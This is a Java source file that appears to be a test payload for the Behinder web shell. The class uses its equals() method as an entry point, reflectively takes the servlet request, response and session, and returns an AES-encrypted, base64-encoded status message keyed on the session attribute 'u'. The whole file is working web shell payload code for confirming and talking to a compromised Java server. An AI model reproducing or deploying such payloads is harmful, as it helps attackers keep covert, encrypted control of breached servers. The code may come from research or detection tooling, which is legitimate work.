package com.reajason.javaweb.behinder.payloads;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
@SuppressWarnings("all")
public class Test {
    private Object Request;
    private Object Response;
    private Object Session;

    public Test() {
    }

    public boolean equals(Object obj) {
        Map<String, String> result = new LinkedHashMap();

        try {
            this.fillContext(obj);
            result.put("status", "success");
            result.put("msg", "xixi");
        } catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "success");
        } finally {
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                Method write = so.getClass().getMethod("write", byte[].class);
                String jsonStr = this.buildJson(result, true);
                write.invoke(so, this.Encrypt(jsonStr.getBytes("UTF-8")));
                so.getClass().getMethod("flush").invoke(so);
                so.getClass().getMethod("close").invoke(so);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return true;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bos.write(encrypted);
        return this.base64encode(bos.toByteArray()).getBytes();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");

        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = (String) entity.get(key);
            if (encode) {
                value = this.base64encode(value.getBytes());
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
            this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
            this.Session = obj.getClass().getMethod("getSession").invoke(obj);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }

        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
        } catch (Throwable var7) {
            this.getClass();
            Class Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
            result = result.replace("\n", "").replace("\r", "");
        }

        return result;
    }
}
